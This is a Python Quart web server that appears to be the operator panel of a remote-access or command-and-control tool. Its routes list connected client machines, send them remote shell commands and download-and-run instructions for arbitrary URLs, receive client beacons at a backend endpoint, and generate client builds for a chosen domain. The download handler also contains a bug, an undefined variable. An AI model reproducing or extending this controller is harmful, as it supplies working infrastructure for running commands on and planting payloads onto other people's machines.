from .backend import *
from ..utils import generate_client
from quart import *
import time
from ..config import CONFIG
import base64
# import logging
app = Quart(__name__, static_folder="static")


# handler = logging.FileHandler()
# app.logger.addHandler(handler)


@app.route(CONFIG["web"]["control"])
async def web_control():
    conn=get_list()
    event=get_events("global")
    c = []
    for i in conn.values():
        i["heartbeat"] = int(time.time())-i["heartbeat"] 
        c.append(i)
    return await render_template("manager.html",conn=c,event=event)

@app.route(CONFIG["web"]["control"] + "client/<uuid>",methods=['GET','POST'])
async def web_control_client(uuid):
    if request.method == 'GET':
        conn = get_conn(uuid)
        events = get_events(uuid)
        if not conn:
            return "",404
        return await render_template("control.html",conn=conn,events=events)
    else:
        action = request.args.get("action")
        form = await request.form
        if action == "shell":
            
            target = form['target']
            param = form['param']
            lv2 = {
                "command":target,
                "param":param,
                }
            do_action(uuid,{
                "do":"cmd",
                "data":base64.b64encode(str(lv2).encode()).decode()
            })
            add_events(uuid,"Server Shell %s>>\nCommand:%s\nParam:%s\n<<< Shell End\n\n"%(time.asctime(time.localtime(time.time())),target,param))
        if action == "remark":
            remark = form["remark_text"]
            lv2 = {
                "remark":remark,
                }
            do_action(uuid,{
                "do":"remark",
                "data":str(lv2)
            })
            add_events(uuid,"Server Remark %s>>\nChange:%s\n<<< Remark End\n\n"%(time.asctime(time.localtime(time.time())),remark))
        if action == "download":
            http = form["http"]
            path = form["path"]
            is_run = form["is_run"]
            lv2 = {
                "url":http,
                "path":path,
                "is_run":is_run
                }
            do_action(uuid,{
                "do":"download",
                "data":str(lv2)
            })
            add_events(uuid,"Server Download %s>>\nAddress:%s\nSavePath:%s\nrun?:%s\n<<< Download End\n\n"%(time.asctime(time.localtime(time.time())),url,path,is_run))
        return redirect(request.referrer)



@app.route(CONFIG["web"]["backend"], methods=['POST'])
async def backend():
    # todo:check UA and other
    data = await request.get_data()
    if CONFIG["base"]["cdn"] is False:
        return handle(data, request.remote_addr)
    else:
        return handle(data, request.headers[CONFIG["base"]["source_ip_tag"]])


@app.route('/generate/', methods=['GET'])
async def generate():
    domain = request.args.get("domain")
    version = request.args.get("version")
    ok, result, filename = generate_client(domain, version)
    if not ok:
        return result
    else:
        return await send_from_directory(app.static_folder, result, as_attachment=True, attachment_filename="")
